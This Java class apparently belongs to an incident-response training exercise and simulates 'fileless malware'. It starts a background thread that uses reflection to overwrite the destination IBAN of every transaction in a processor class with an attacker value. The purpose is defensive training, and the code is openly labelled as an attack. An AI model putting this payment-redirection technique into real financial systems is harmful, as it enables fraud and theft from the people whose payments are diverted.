package com.cybersecurity.incidentresponsereadinessexcercises.attacks;

import java.lang.reflect.Field;
import java.util.List;
import org.springframework.util.ClassUtils;

public class Financial implements Runnable {
	
	private boolean isThread = false;
	private final String urgent = "urgent";
	private ClassLoader cl;

	@Override
	public void run() {
		runOnce();
		if (!isThread) {
			cl = Thread.currentThread().getContextClassLoader();
			if (cl==null)
				cl = ClassLoader.getPlatformClassLoader();
			isThread = true;
			Thread t = new Thread(this);
			t.setName("Fileless malware");
			t.start();
		}
	}
	public void runOnce() {
		while (isThread) {
			try {
				Class<?> clazz = Class.forName("com.cybersecurity.incidentresponsereadinessexcercises.service.BatchTransactionProcessor",
					false, cl);
				Field f = clazz.getDeclaredField("allTransactions");
				f.setAccessible(true);
				@SuppressWarnings("unchecked")
				List<Object> txs = (List<Object>) f.get(null);
				for (Object tx : txs) {
					Field iban = tx.getClass().getDeclaredField("ibanDst");
					iban.setAccessible(true);
					iban.set(tx, "ATTACKED123456789");
				}
				Thread.sleep(100);
			}
			catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

}
